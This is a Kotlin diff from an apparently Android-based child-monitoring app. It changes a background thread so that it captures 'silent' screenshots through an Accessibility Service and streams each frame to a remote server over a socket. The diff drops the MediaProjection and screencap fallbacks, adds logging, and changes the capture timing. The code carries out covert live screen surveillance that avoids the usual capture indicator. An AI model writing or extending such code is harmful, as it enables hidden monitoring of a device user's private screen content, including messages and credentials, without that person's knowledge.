@@ -119,11 +119,9 @@ class ChildSocketManager private constructor(private val context: Context) {
                         isStreamingScreen = true
                         screenStreamThread?.interrupt()
                         screenStreamThread = Thread {
+                            Log.i(TAG, "Starting silent Accessibility live screen loop...")
                             while (isStreamingScreen) {
                                 try {
-                                    var frameSent = false
-
-                                    // 1. Try silent Accessibility Service live screenshot
                                     val latch = java.util.concurrent.CountDownLatch(1)
                                     ChildAccessibilityService.takeSilentScreenshot { silentB64 ->
                                         if (silentB64 != null && silentB64.length > 1000) {
@@ -132,46 +130,17 @@ class ChildSocketManager private constructor(private val context: Context) {
                                                 put("frame", silentB64)
                                             }
                                             socket?.emit("child:screen_frame", frameObj)
-                                            frameSent = true
+                                            Log.i(TAG, "Silent live screen frame streamed (${silentB64.length} chars)")
+                                        } else {
+                                            Log.w(TAG, "Silent live screen frame was null or throttled")
                                         }
                                         latch.countDown()
                                     }
-                                    latch.await(600, java.util.concurrent.TimeUnit.MILLISECONDS)
+                                    latch.await(2000, java.util.concurrent.TimeUnit.MILLISECONDS)
 
-                                    // 2. Try MediaProjection if initialized
-                                    if (!frameSent) {
-                                        try {
-                                            val realFrame = ScreenCaptureManager.getLatestScreenshotBase64()
-                                            if (realFrame != null && realFrame.length > 500) {
-                                                val frameObj = JSONObject().apply {
-                                                    put("deviceId", deviceId)
-                                                    put("frame", realFrame)
-                                                }
-                                                socket?.emit("child:screen_frame", frameObj)
-                                                frameSent = true
-                                            }
-                                        } catch (_: Exception) {}
-                                    }
-
-                                    // 3. Try native screencap binary
-                                    if (!frameSent) {
-                                        try {
-                                            val proc = Runtime.getRuntime().exec("screencap -p")
-                                            val bytes = proc.inputStream.readBytes()
-                                            if (bytes.size > 2000) {
-                                                val b64 = "data:image/png;base64," + Base64.encodeToString(bytes, Base64.NO_WRAP)
-                                                val frameObj = JSONObject().apply {
-                                                    put("deviceId", deviceId)
-                                                    put("frame", b64)
-                                                }
-                                                socket?.emit("child:screen_frame", frameObj)
-                                                frameSent = true
-                                            }
-                                        } catch (_: Exception) {}
-                                    }
-
-                                    Thread.sleep(350)
+                                    Thread.sleep(1800)
                                 } catch (e: Exception) {
+                                    Log.e(TAG, "Live screen loop interrupted: ${e.message}")
                                     break
                                 }
                             }
